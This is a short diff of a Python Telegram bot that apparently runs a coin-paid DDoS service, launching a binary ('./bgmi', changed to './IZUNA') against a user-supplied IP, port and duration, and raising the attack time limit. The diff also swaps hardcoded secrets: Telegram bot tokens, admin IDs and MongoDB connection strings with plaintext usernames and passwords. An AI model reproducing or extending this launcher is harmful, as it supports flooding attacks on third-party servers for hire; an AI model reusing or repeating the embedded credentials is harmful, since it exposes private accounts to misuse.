@@ -9,12 +9,12 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7601607062:AAHPiVrFWLumct-DE8xMTgF6KWS4E6zoHms'  # Replace with your bot token
-ADMIN_USER_ID = 1240179115
-MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
-DB_NAME = "ninja"
+TELEGRAM_BOT_TOKEN = '7455722221:AAEy6bd4crt2lEdKEjzCxoSM4Zdhq_eh_nE'  # Replace with your bot token
+ADMIN_USER_ID = 1216702307
+MONGO_URI = "mongodb+srv://donmourya248:Santosh700@redhat.drq43.mongodb.net/RedHat?retryWrites=true&w=majority&appName=RedHat"
+DB_NAME = "skdr"
 COLLECTION_NAME = "users"
-ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
+ATTACK_TIME_LIMIT = 300  # Maximum attack duration in seconds
 COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
 
 # MongoDB setup
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./bgmi {ip} {port} {duration} {13} {600}"
+        command = f"./IZUNA {ip} {port} {duration} {300} {1000}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
